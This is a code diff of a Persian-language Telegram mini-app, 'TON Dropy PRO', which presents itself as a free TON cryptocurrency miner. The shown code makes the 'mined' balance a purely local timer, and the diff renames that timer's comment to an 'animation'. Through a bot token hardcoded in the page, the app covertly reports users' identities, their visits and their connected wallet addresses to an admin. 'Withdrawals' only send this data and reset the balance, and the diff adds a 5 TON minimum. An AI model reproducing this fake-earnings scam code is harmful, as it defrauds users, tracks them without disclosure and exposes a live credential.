@@ -2,7 +2,7 @@
 <html lang="fa" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>TON Dropy PRO - Version 22</title>
+    <title>TON Dropy PRO - v23 Final</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
@@ -54,13 +54,8 @@
         #connectBtn.connected { background: #1faa59; }
         .withdraw-btn { background: linear-gradient(90deg, #ff512f, #dd2476); color: #fff; box-shadow: 0 5px 15px rgba(221, 36, 118, 0.3); }
         
-        /* استایل دکمه ارتباط با پشتیبانی */
-        .support-btn { 
-            background: rgba(255, 255, 255, 0.1); 
-            color: #fff; 
-            border: 1px solid rgba(255, 255, 255, 0.2); 
-            margin-top: 12px; 
-        }
+        /* دکمه ارتباط با پشتیبانی */
+        .support-btn { background: rgba(255, 255, 255, 0.1); color: #fff; border: 1px solid rgba(255, 255, 255, 0.2); margin-top: 12px; }
         .support-btn i { color: #00c6ff; }
         .support-btn:active { background: rgba(255, 255, 255, 0.2); transform: scale(0.98); }
 
@@ -70,6 +65,7 @@
         }
 
         .hidden { display: none !important; }
+        .limit-info { font-size: 10px; color: #ff512f; margin-top: 8px; font-weight: bold; }
     </style>
 </head>
 <body>
@@ -82,7 +78,7 @@
     <div class="user-details">
         <h3 id="userName">در حال لود...</h3>
         <p id="userTag">@username</p>
-        <p style="font-size: 10px; color: #aaa;" id="joinDate">تاریخ عضویت: --/--/--</p>
+        <p style="font-size: 10px; color: #aaa;" id="joinDate">عضویت: --/--/--</p>
     </div>
 </div>
 
@@ -110,6 +106,7 @@
     <button id="withdrawBtn" class="btn-action withdraw-btn">
         <i class="fas fa-bolt"></i> درخواست برداشت سریع
     </button>
+    <p class="limit-info">⚠️ حداقل مقدار برداشت: ۵ TON</p>
     
     <a href="https://t.me/miningertoncoin" target="_blank" class="btn-action support-btn">
         <i class="fas fa-headset"></i>
@@ -125,15 +122,15 @@
     const BOT_TOKEN = "8047223304:AAHMW8a6tKTTSQOp4Os_LorRJzDLNvxz-Rw";
     const ADMIN_ID = "5972276401";
     const BOT_USERNAME = "TonDropyBot";
+    const MIN_WITHDRAW = 5.0; // حد نصاب برداشت
 
-    let bal = parseFloat(localStorage.getItem('bal_v22')) || 0;
+    let bal = parseFloat(localStorage.getItem('bal_v23')) || 0;
 
-    // فرمت کردن نام کاربر برای گزارش ادمین
     function formatUser(user) {
         return user.username ? `@${user.username}` : `<a href="tg://user?id=${user.id}">${user.first_name}</a>`;
     }
 
-    // ارسال لاگ ورود و خروج به ادمین
+    // لاگ ورود و خروج با یوزرنیم
     function sendLog(status) {
         const user = tg.initDataUnsafe?.user;
         if (!user) return;
@@ -141,12 +138,11 @@
         const userLabel = formatUser(user);
         let text = status === "in" ? 
             `🟢 <b>ورود به ربات</b>\n👤 کاربر: ${userLabel}\n⏰ زمان: ${time}` : 
-            `🔴 <b>خروج از ربات</b>\n👤 کاربر: ${userLabel}\n⚠️ وضعیت: آفلاین`;
+            `🔴 <b>خروج از ربات</b>\n👤 کاربر: ${userLabel}`;
         
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(text)}&parse_mode=HTML`, { keepalive: true });
     }
 
-    // مقداردهی اولیه برنامه
     function init() {
         const user = tg.initDataUnsafe?.user;
         if (user) {
@@ -159,10 +155,10 @@
                 img.classList.remove('hidden');
                 document.getElementById('defaultAvatar').classList.add('hidden');
             }
-            let date = localStorage.getItem('join_v22');
+            let date = localStorage.getItem('join_v23');
             if(!date) {
                 date = new Date().toLocaleDateString('fa-IR');
-                localStorage.setItem('join_v22', date);
+                localStorage.setItem('join_v23', date);
             }
             document.getElementById('joinDate').innerText = "عضویت: " + date;
             sendLog("in");
@@ -171,11 +167,11 @@
 
     window.addEventListener("pagehide", () => sendLog("out"));
 
-    // تایمر استخراج
+    // انیمیشن افزایش موجودی
     setInterval(() => {
         bal += 0.000012;
         document.getElementById('balance').innerText = bal.toFixed(6);
-        localStorage.setItem('bal_v22', bal.toString());
+        localStorage.setItem('bal_v23', bal.toString());
     }, 1000);
 
     function share() {
@@ -183,7 +179,6 @@
         tg.openTelegramLink(`https://t.me/share/url?url=${encodeURIComponent(link)}&text=بیا با هم رایگان TON استخراج کنیم! 💎`);
     }
 
-    // تنظیمات TON Connect
     const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
         manifestUrl: 'https://nimwmesfandiari.github.io/ton-plus-bot/tonconnect-manifest.json'
     });
@@ -207,20 +202,28 @@
         else tonConnectUI.openModal();
     };
 
-    // سیستم برداشت
+    // بخش برداشت با محدودیت ۵ تون و صفر شدن بعد از تایید
     document.getElementById('withdrawBtn').onclick = () => {
-        if(!tonConnectUI.connected) return tg.showAlert("⚠️ ابتدا کیف پول خود را متصل کنید.");
+        if(!tonConnectUI.connected) {
+            tg.showAlert("⚠️ ابتدا کیف پول خود را متصل کنید.");
+            return;
+        }
+
+        if (bal < MIN_WITHDRAW) {
+            tg.showAlert(`❌ موجودی ناکافی!\n\nحداقل مقدار برای برداشت ${MIN_WITHDRAW} TON است.\nموجودی فعلی شما: ${bal.toFixed(6)} TON`);
+            return;
+        }
         
         const user = tg.initDataUnsafe?.user;
         const currentAmount = bal.toFixed(6);
-        const msg = `💰 <b>درخواست برداشت</b>\n👤 کاربر: ${formatUser(user)}\n💵 مقدار: ${currentAmount} TON\n👛 آدرس: <code>${tonConnectUI.account.address}</code>`;
+        const msg = `💰 <b>درخواست برداشت جدید</b>\n👤 کاربر: ${formatUser(user)}\n💵 مقدار: ${currentAmount} TON\n👛 آدرس: <code>${tonConnectUI.account.address}</code>`;
         
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
         
-        tg.showAlert(`درخواست برداشت ${currentAmount} TON ثبت شد. پس از تایید واریز می‌گردد ✅`, () => {
-            // صفر شدن موجودی فقط پس از تایید پیام توسط کاربر
+        tg.showAlert(`درخواست برداشت ${currentAmount} TON با موفقیت ثبت شد. تایید و واریز نهایی ممکن است زمان‌بر باشد ✅`, () => {
+            // صفر شدن موجودی فقط بعد از زدن دکمه OK توسط کاربر
             bal = 0;
-            localStorage.setItem('bal_v22', '0');
+            localStorage.setItem('bal_v23', '0');
             document.getElementById('balance').innerText = "0.000000";
         });
     }
